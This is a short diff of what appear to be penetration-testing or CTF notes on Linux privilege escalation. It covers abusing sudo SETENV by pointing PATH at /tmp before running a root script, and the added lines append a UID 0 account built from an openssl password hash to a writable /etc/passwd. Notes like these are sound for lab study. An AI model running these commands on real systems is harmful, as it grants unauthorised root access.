@@ -22,5 +22,10 @@ If we see a SETENV in that case we need to -
     e. Now set the PATH environment variable to /tmp and also execute the cleanup.sh script to priv esc
         
          sudo PATH=/tmp:$PATH /opt/cleanup.sh
+
+if you have read/write access to /etc/passwd you can:
+openssl passwd <whateverPasswordYouWant>
+echo "myUser:<openSSLHash>:0:0:root:/root:/bin/bash" >> /etc/passwd
+su myUser
          
    
